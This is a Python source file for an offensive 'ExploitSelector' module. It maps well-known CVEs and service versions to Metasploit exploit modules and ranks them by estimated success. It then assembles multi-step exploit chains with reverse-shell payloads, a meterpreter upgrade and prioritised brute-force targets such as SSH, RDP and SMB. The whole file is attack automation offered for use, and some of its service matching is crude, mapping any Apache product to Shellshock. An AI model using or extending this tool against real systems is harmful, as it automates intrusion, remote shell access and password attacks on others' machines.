"""Module ExploitSelector - S\u00e9lection automatique d'exploits"""
import re
from typing import Dict, List, Optional


class ExploitSelector:
    """S\u00e9lecteur automatique d'exploits bas\u00e9 sur vuln\u00e9rabilit\u00e9s"""
    
    def __init__(self):
        """Initialize exploit selector with mappings"""
        # Mapping CVE -> Metasploit exploit
        self.cve_to_exploit = self._build_cve_mappings()
        
        # Mapping service/version -> known exploits
        self.service_to_exploit = self._build_service_mappings()
    
    def _build_cve_mappings(self) -> Dict:
        """Build CVE to Metasploit exploit mappings"""
        return {
            # Common CVEs with MSF exploits
            'CVE-2017-0144': {  # EternalBlue
                'exploit': 'exploit/windows/smb/ms17_010_eternalblue',
                'platforms': ['windows'],
                'ports': [445],
                'reliability': 'excellent',
                'rank': 10
            },
            'CVE-2021-44228': {  # Log4Shell
                'exploit': 'exploit/multi/http/log4shell_header_injection',
                'platforms': ['linux', 'windows'],
                'ports': [80, 443, 8080],
                'reliability': 'excellent',
                'rank': 10
            },
            'CVE-2014-6271': {  # Shellshock
                'exploit': 'exploit/multi/http/apache_mod_cgi_bash_env_exec',
                'platforms': ['linux', 'unix'],
                'ports': [80, 443],
                'reliability': 'excellent',
                'rank': 9
            },
            'CVE-2012-1823': {  # PHP CGI
                'exploit': 'exploit/multi/http/php_cgi_arg_injection',
                'platforms': ['linux', 'windows'],
                'ports': [80, 443],
                'reliability': 'excellent',
                'rank': 9
            },
            'CVE-2011-2523': {  # vsFTPd backdoor
                'exploit': 'exploit/unix/ftp/vsftpd_234_backdoor',
                'platforms': ['linux'],
                'ports': [21],
                'reliability': 'excellent',
                'rank': 10
            },
            'CVE-2008-4250': {  # MS08-067
                'exploit': 'exploit/windows/smb/ms08_067_netapi',
                'platforms': ['windows'],
                'ports': [445],
                'reliability': 'great',
                'rank': 9
            },
            'CVE-2017-7494': {  # SambaCry
                'exploit': 'exploit/linux/samba/is_known_pipename',
                'platforms': ['linux'],
                'ports': [445],
                'reliability': 'good',
                'rank': 8
            },
            'CVE-2019-0708': {  # BlueKeep
                'exploit': 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce',
                'platforms': ['windows'],
                'ports': [3389],
                'reliability': 'average',
                'rank': 7
            },
            'CVE-2015-1427': {  # ElasticSearch RCE
                'exploit': 'exploit/multi/elasticsearch/script_mvel_rce',
                'platforms': ['linux', 'windows'],
                'ports': [9200],
                'reliability': 'excellent',
                'rank': 9
            },
            'CVE-2018-7600': {  # Drupalgeddon2
                'exploit': 'exploit/unix/webapp/drupal_drupalgeddon2',
                'platforms': ['linux'],
                'ports': [80, 443],
                'reliability': 'excellent',
                'rank': 10
            }
        }
    
    def _build_service_mappings(self) -> Dict:
        """Build service/version to exploit mappings"""
        return {
            'vsftpd 2.3.4': {
                'exploit': 'exploit/unix/ftp/vsftpd_234_backdoor',
                'cve': 'CVE-2011-2523',
                'reliability': 'excellent',
                'rank': 10
            },
            'apache 2.4': {
                'exploit': 'exploit/multi/http/apache_mod_cgi_bash_env_exec',
                'cve': 'CVE-2014-6271',
                'reliability': 'excellent',
                'rank': 9
            },
            'tomcat': {
                'exploit': 'exploit/multi/http/tomcat_mgr_upload',
                'cve': None,
                'reliability': 'excellent',
                'rank': 8,
                'notes': 'Requires manager credentials'
            },
            'elasticsearch 1.4': {
                'exploit': 'exploit/multi/elasticsearch/script_mvel_rce',
                'cve': 'CVE-2015-1427',
                'reliability': 'excellent',
                'rank': 9
            },
            'drupal 7': {
                'exploit': 'exploit/unix/webapp/drupal_drupalgeddon2',
                'cve': 'CVE-2018-7600',
                'reliability': 'excellent',
                'rank': 10
            },
            'wordpress': {
                'exploit': 'exploit/unix/webapp/wp_admin_shell_upload',
                'cve': None,
                'reliability': 'good',
                'rank': 7,
                'notes': 'Requires admin credentials'
            }
        }
    
    def analyze_target(self, vulnerabilities: List[Dict], services: List[Dict]) -> List[Dict]:
        """
        Analyze target and return exploitable vulnerabilities
        
        Args:
            vulnerabilities: List of CVEs found
            services: List of services detected
        
        Returns:
            List of exploitable vulnerabilities with exploit info
        """
        exploitable = []
        
        # Check CVE-based exploits
        for vuln in vulnerabilities:
            cve_id = vuln.get('cve_id', '')
            
            if cve_id in self.cve_to_exploit:
                exploit_info = self.cve_to_exploit[cve_id].copy()
                exploit_info.update({
                    'vuln_type': 'cve',
                    'cve_id': cve_id,
                    'cvss_score': vuln.get('cvss_score', 0),
                    'target_service': vuln.get('service', 'unknown'),
                    'target_port': vuln.get('port', 0)
                })
                
                exploitable.append(exploit_info)
        
        # Check service-based exploits
        for service in services:
            service_name = service.get('service', '').lower()
            version = service.get('version', '').lower()
            product = service.get('product', '').lower()
            
            # Check exact match
            service_string = f"{product} {version}".strip()
            
            if service_string in self.service_to_exploit:
                exploit_info = self.service_to_exploit[service_string].copy()
                exploit_info.update({
                    'vuln_type': 'service',
                    'target_service': service_string,
                    'target_port': service.get('port', 0)
                })
                
                exploitable.append(exploit_info)
            
            # Check partial match
            for key in self.service_to_exploit.keys():
                if key.split()[0] in product or key.split()[0] in service_name:
                    exploit_info = self.service_to_exploit[key].copy()
                    exploit_info.update({
                        'vuln_type': 'service',
                        'target_service': f"{product} {version}",
                        'target_port': service.get('port', 0)
                    })
                    
                    exploitable.append(exploit_info)
                    break
        
        # Sort by rank (higher is better)
        exploitable.sort(key=lambda x: x.get('rank', 0), reverse=True)
        
        return exploitable
    
    def get_exploit_chain(self, target_data: Dict) -> List[Dict]:
        """
        Generate exploit chain for target
        
        Args:
            target_data: Dict containing vulnerabilities, services, etc.
        
        Returns:
            List of exploit steps in order
        """
        vulnerabilities = target_data.get('vulnerabilities', [])
        services = target_data.get('services', [])
        target_ip = target_data.get('ip', 'unknown')
        
        # Analyze for exploitable vulns
        exploitable = self.analyze_target(vulnerabilities, services)
        
        if not exploitable:
            return []
        
        # Build exploit chain
        chain = []
        
        for idx, exploit_info in enumerate(exploitable[:3]):  # Top 3 exploits
            step = {
                'step': idx + 1,
                'exploit': exploit_info['exploit'],
                'target_service': exploit_info.get('target_service', 'unknown'),
                'cve': exploit_info.get('cve'),
                'success_probability': self._calculate_success_probability(exploit_info),
                'options': {
                    'RHOSTS': target_ip,
                    'RPORT': exploit_info.get('target_port', 0)
                },
                'payload': 'generic/shell_reverse_tcp',
                'notes': exploit_info.get('notes', '')
            }
            
            # Add payload upgrade step
            if idx == 0:  # Only for first exploit
                chain.append(step)
                
                # Add upgrade to meterpreter step
                chain.append({
                    'step': idx + 2,
                    'exploit': 'post/multi/manage/shell_to_meterpreter',
                    'description': 'Upgrade shell to meterpreter',
                    'success_probability': 0.95,
                    'depends_on': idx + 1
                })
            else:
                step['step'] = len(chain) + 1
                chain.append(step)
        
        return chain
    
    def _calculate_success_probability(self, exploit_info: Dict) -> float:
        """Calculate success probability based on exploit info"""
        reliability = exploit_info.get('reliability', 'average')
        rank = exploit_info.get('rank', 5)
        
        # Base probability from reliability
        reliability_map = {
            'excellent': 0.9,
            'great': 0.8,
            'good': 0.7,
            'average': 0.5,
            'low': 0.3
        }
        
        base_prob = reliability_map.get(reliability, 0.5)
        
        # Adjust based on rank
        rank_adjustment = (rank - 5) * 0.05
        
        final_prob = min(max(base_prob + rank_adjustment, 0.1), 0.95)
        
        return round(final_prob, 2)
    
    def suggest_bruteforce_targets(self, services: List[Dict]) -> List[Dict]:
        """
        Suggest services to bruteforce
        
        Args:
            services: List of detected services
        
        Returns:
            List of services suitable for bruteforce
        """
        bruteforce_targets = []
        
        # Services that are good bruteforce candidates
        bruteforce_services = {
            'ssh': {'port': 22, 'priority': 'high'},
            'ftp': {'port': 21, 'priority': 'medium'},
            'telnet': {'port': 23, 'priority': 'high'},
            'smb': {'port': 445, 'priority': 'high'},
            'rdp': {'port': 3389, 'priority': 'high'},
            'mysql': {'port': 3306, 'priority': 'medium'},
            'postgresql': {'port': 5432, 'priority': 'medium'},
            'http': {'port': 80, 'priority': 'low'}
        }
        
        for service in services:
            service_name = service.get('service', '').lower()
            port = service.get('port', 0)
            
            if service_name in bruteforce_services:
                target = {
                    'service': service_name,
                    'port': port,
                    'priority': bruteforce_services[service_name]['priority'],
                    'method': 'bruteforce'
                }
                
                bruteforce_targets.append(target)
        
        # Sort by priority
        priority_order = {'high': 3, 'medium': 2, 'low': 1}
        bruteforce_targets.sort(key=lambda x: priority_order.get(x['priority'], 0), reverse=True)
        
        return bruteforce_targets


# Example usage
if __name__ == '__main__':
    selector = ExploitSelector()
    
    # Example target data
    target_data = {
        'ip': '192.168.1.100',
        'vulnerabilities': [
            {
                'cve_id': 'CVE-2021-44228',
                'cvss_score': 10.0,
                'service': 'Apache Tomcat 9.0.1',
                'port': 8080
            },
            {
                'cve_id': 'CVE-2017-0144',
                'cvss_score': 8.1,
                'service': 'SMB',
                'port': 445
            }
        ],
        'services': [
            {'service': 'ssh', 'port': 22, 'product': 'OpenSSH', 'version': '7.4'},
            {'service': 'http', 'port': 8080, 'product': 'Apache Tomcat', 'version': '9.0.1'}
        ]
    }
    
    # Get exploit chain
    chain = selector.get_exploit_chain(target_data)
    
    print("Exploit Chain:")
    for step in chain:
        print(f"\nStep {step['step']}:")
        print(f"  Exploit: {step.get('exploit', step.get('description'))}")
        print(f"  Success Probability: {step.get('success_probability', 'N/A')}")
        if 'options' in step:
            print(f"  Options: {step['options']}")
